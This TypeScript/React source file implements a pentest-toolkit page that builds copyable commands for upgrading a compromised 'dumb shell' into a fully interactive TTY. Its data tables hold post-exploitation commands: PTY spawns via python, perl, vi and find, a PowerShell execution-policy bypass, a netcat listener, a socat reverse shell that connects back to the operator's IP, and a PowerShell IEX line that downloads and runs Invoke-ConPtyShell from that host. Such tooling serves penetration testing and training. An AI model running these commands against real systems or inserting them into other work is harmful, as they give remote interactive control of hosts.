import { useState } from 'react'
import { Terminal, Copy, Check } from '@phosphor-icons/react'
import { ToolLayout } from '../../components/ToolLayout'
import type { Tool } from '../types'

interface Ctx { shell: string; term: string; rows: string; cols: string; ip: string; port: string }

const STTY_STEPS: {
  label: string
  where: 'target' | 'local' | 'manual'
  note?: string
  build: (ctx: Ctx) => string
}[] = [
  {
    label: 'Spawn PTY',
    where: 'target',
    build: ctx => `python3 -c 'import pty; pty.spawn("${ctx.shell}")'`,
    note: 'If python3 is unavailable, use an alternative spawn from the list below.',
  },
  {
    label: 'Background the shell',
    where: 'manual',
    build: () => 'Ctrl + Z',
  },
  {
    label: 'Fix local terminal',
    where: 'local',
    build: () => 'stty raw -echo; fg',
    note: 'Disables local echo and brings the shell back to foreground.',
  },
  {
    label: 'Reset',
    where: 'target',
    build: () => 'reset',
  },
  {
    label: 'Set TERM',
    where: 'target',
    build: ctx => `export TERM=${ctx.term}`,
  },
  {
    label: 'Set terminal size',
    where: 'target',
    build: ctx => `stty rows ${ctx.rows} cols ${ctx.cols}`,
    note: 'Run "stty size" in your local terminal to get the right values.',
  },
]

const ALT_SPAWNS: { label: string; build: (ctx: Ctx) => string }[] = [
  { label: 'Python 2',      build: ctx => `python -c 'import pty; pty.spawn("${ctx.shell}")'` },
  { label: 'script',        build: ctx => `script /dev/null -c ${ctx.shell}` },
  { label: 'script (BSD)',  build: ctx => `script -q /dev/null ${ctx.shell}` },
  { label: 'Perl',          build: ctx => `perl -e 'exec "${ctx.shell}";'` },
  { label: 'Ruby',          build: ctx => `ruby -e 'exec "${ctx.shell}"'` },
  { label: 'Lua',           build: ctx => `lua -e 'os.execute("${ctx.shell}")'` },
  { label: 'PHP',           build: ctx => `php -r 'pcntl_exec("${ctx.shell}");'` },
  { label: 'awk',           build: ctx => `awk 'BEGIN {system("${ctx.shell}")}'` },
  { label: 'find',          build: ctx => `find . -exec ${ctx.shell} \\; -quit` },
  { label: 'vi',            build: ctx => `vi -c ':!${ctx.shell}'` },
  { label: 'expect',        build: ctx => `expect -c 'spawn ${ctx.shell}; interact'` },
  { label: 'socat (stdio)', build: ctx => `socat exec:'${ctx.shell} -li',pty,stderr,setsid,sigint,sane STDIO` },
]

const WINDOWS_TIPS: { label: string; where: 'target' | 'local'; note?: string; build: (ctx: Ctx) => string }[] = [
  {
    label: 'cmd → PowerShell',
    where: 'target',
    build: () => 'powershell -nop -ep bypass',
    note: 'Run from a cmd shell to drop into PowerShell with execution policy bypassed.',
  },
  {
    label: 'PowerShell → cmd',
    where: 'target',
    build: () => 'cmd /k',
  },
  {
    label: 'rlwrap listener',
    where: 'local',
    build: ctx => `rlwrap nc -lvnp ${ctx.port || '[PORT]'}`,
    note: 'Wrap your netcat listener with readline — adds arrow keys, history, and Ctrl+C to any shell.',
  },
  {
    label: 'ConPTY (nishang)',
    where: 'target',
    build: ctx => `IEX(New-Object Net.WebClient).DownloadString('http://${ctx.ip || '[LOCAL_IP]'}/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell ${ctx.ip || '[LOCAL_IP]'} ${ctx.port || '[PORT]'}`,
    note: 'Requires Nishang\'s Invoke-ConPtyShell.ps1 served from your local machine. Gives a fully interactive Windows shell.',
  },
]

const SOCAT_STEPS: { label: string; where: 'target' | 'local'; build: (ctx: Ctx) => string }[] = [
  {
    label: 'Listen',
    where: 'local',
    build: ctx => `socat file:\`tty\`,raw,echo=0 tcp-listen:${ctx.port || '[PORT]'}`,
  },
  {
    label: 'Connect',
    where: 'target',
    build: ctx => `socat exec:'${ctx.shell} -li',pty,stderr,setsid,sigint,sane tcp:${ctx.ip || '[LOCAL_IP]'}:${ctx.port || '[PORT]'}`,
  },
]

const WHERE_STYLE: Record<string, string> = {
  target:   'bg-red-500/15 text-red-400',
  local: 'bg-blue-500/15 text-blue-400',
  manual:   'bg-vs-active text-vs-muted',
}

function CopyBtn({ value }: { value: string }) {
  const [copied, setCopied] = useState(false)
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(value); setCopied(true); setTimeout(() => setCopied(false), 1500) }}
      title="Copy"
      className="shrink-0 p-1 rounded text-vs-muted hover:text-vs-text hover:bg-vs-active transition-colors"
    >
      {copied ? <Check size={13} weight="bold" className="text-green-400" /> : <Copy size={13} />}
    </button>
  )
}

function Field({ label, value, onChange, placeholder }: {
  label: string; value: string; onChange: (v: string) => void; placeholder?: string
}) {
  return (
    <div className="flex flex-col gap-1">
      <label className="text-vs-muted text-[10px] uppercase tracking-widest">{label}</label>
      <input
        type="text"
        value={value}
        onChange={e => onChange(e.target.value)}
        placeholder={placeholder}
        spellCheck={false}
        className="w-full bg-vs-sidebar border border-vs-border text-vs-text text-xs font-mono px-2 py-1.5 rounded outline-none focus:border-vs-accent transition-colors"
      />
    </div>
  )
}

function ShellUpgrade() {
  const [shell, setShell] = useState('/bin/bash')
  const [term,  setTerm]  = useState('xterm-256color')
  const [rows,  setRows]  = useState('38')
  const [cols,  setCols]  = useState('116')
  const [ip,    setIp]    = useState('')
  const [port,  setPort]  = useState('4444')

  const ctx: Ctx = { shell, term, rows, cols, ip, port }

  return (
    <ToolLayout title="Shell Upgrade" description="Techniques to upgrade a dumb shell to a fully interactive TTY">
      <div className="flex flex-col gap-6 max-w-2xl">

        {/* Context inputs */}
        <div className="flex flex-col gap-2">
          <span className="text-vs-muted text-xs uppercase tracking-widest">Context</span>
          <div className="grid grid-cols-3 gap-2">
            <Field label="Shell"       value={shell} onChange={setShell} placeholder="/bin/bash" />
            <Field label="TERM"        value={term}  onChange={setTerm}  placeholder="xterm-256color" />
            <Field label="Rows"        value={rows}  onChange={setRows}  placeholder="38" />
            <Field label="Cols"        value={cols}  onChange={setCols}  placeholder="116" />
            <Field label="Local IP"    value={ip}    onChange={setIp}    placeholder="10.10.14.1" />
            <Field label="Port"        value={port}  onChange={setPort}  placeholder="4444" />
          </div>
        </div>

        {/* stty method */}
        <div className="flex flex-col gap-2">
          <span className="text-vs-muted text-xs uppercase tracking-widest">stty upgrade</span>
          <div className="flex flex-col gap-1.5">
            {STTY_STEPS.map((step, i) => {
              const cmd = step.build(ctx)
              const isManual = step.where === 'manual'
              return (
                <div key={i} className="flex items-start gap-3 bg-vs-sidebar border border-vs-border rounded px-3 py-2">
                  <span className="shrink-0 w-5 h-5 rounded-full bg-vs-active text-vs-muted text-[10px] flex items-center justify-center font-mono mt-0.5">
                    {i + 1}
                  </span>
                  <div className="flex flex-col gap-1 flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-vs-text text-xs">{step.label}</span>
                      <span className={`text-[9px] px-1.5 py-px rounded ${WHERE_STYLE[step.where]}`}>
                        {isManual ? 'manual' : `on ${step.where}`}
                      </span>
                    </div>
                    <span className={`text-xs font-mono break-all ${isManual ? 'text-vs-muted' : 'text-vs-text'}`}>{cmd}</span>
                    {step.note && <span className="text-vs-muted text-[10px] leading-relaxed">{step.note}</span>}
                  </div>
                  {!isManual && <CopyBtn value={cmd} />}
                </div>
              )
            })}
          </div>
        </div>

        {/* Alternative spawns */}
        <div className="flex flex-col gap-2">
          <span className="text-vs-muted text-xs uppercase tracking-widest">Alternative PTY spawns</span>
          <p className="text-vs-muted text-xs">Drop-in replacements for step 1 when Python 3 is not available.</p>
          <div className="flex flex-col gap-1">
            {ALT_SPAWNS.map((s, i) => {
              const cmd = s.build(ctx)
              return (
                <div key={i} className="flex items-center gap-2 bg-vs-sidebar border border-vs-border rounded px-3 py-2">
                  <span className="shrink-0 text-[10px] font-mono px-1.5 py-0.5 rounded bg-vs-active text-vs-muted w-24 text-center">{s.label}</span>
                  <span className="text-vs-text text-xs font-mono flex-1 break-all">{cmd}</span>
                  <CopyBtn value={cmd} />
                </div>
              )
            })}
          </div>
        </div>

        {/* Windows */}
        <div className="flex flex-col gap-2">
          <span className="text-vs-muted text-xs uppercase tracking-widest">Windows</span>
          <div className="flex flex-col gap-1.5">
            {WINDOWS_TIPS.map((tip, i) => {
              const cmd = tip.build(ctx)
              return (
                <div key={i} className="flex items-start gap-3 bg-vs-sidebar border border-vs-border rounded px-3 py-2">
                  <div className="flex flex-col gap-1 flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-vs-text text-xs">{tip.label}</span>
                      <span className={`text-[9px] px-1.5 py-px rounded ${WHERE_STYLE[tip.where]}`}>
                        on {tip.where}
                      </span>
                    </div>
                    <span className="text-vs-text text-xs font-mono break-all">{cmd}</span>
                    {tip.note && <span className="text-vs-muted text-[10px] leading-relaxed">{tip.note}</span>}
                  </div>
                  <CopyBtn value={cmd} />
                </div>
              )
            })}
          </div>
        </div>

        {/* socat full upgrade */}
        <div className="flex flex-col gap-2">
          <span className="text-vs-muted text-xs uppercase tracking-widest">socat full upgrade</span>
          <p className="text-vs-muted text-xs">
            Requires <span className="font-mono text-vs-text">socat</span> on both ends.
            Gives a fully interactive shell in one step — no stty juggling needed.
          </p>
          <div className="flex flex-col gap-1.5">
            {SOCAT_STEPS.map((step, i) => {
              const cmd = step.build(ctx)
              return (
                <div key={i} className="flex items-start gap-3 bg-vs-sidebar border border-vs-border rounded px-3 py-2">
                  <div className="flex flex-col gap-1 flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="text-vs-text text-xs">{step.label}</span>
                      <span className={`text-[9px] px-1.5 py-px rounded ${WHERE_STYLE[step.where]}`}>
                        on {step.where}
                      </span>
                    </div>
                    <span className="text-vs-text text-xs font-mono break-all">{cmd}</span>
                  </div>
                  <CopyBtn value={cmd} />
                </div>
              )
            })}
          </div>
        </div>

      </div>
    </ToolLayout>
  )
}

export default {
  meta: {
    slug: 'shell-upgrade',
    name: 'Shell Upgrade',
    description: 'Upgrade a dumb shell to a fully interactive TTY',
    icon: Terminal,
    tags: ['pentest', 'linux', 'windows'],
  },
  Component: ShellUpgrade,
} satisfies Tool
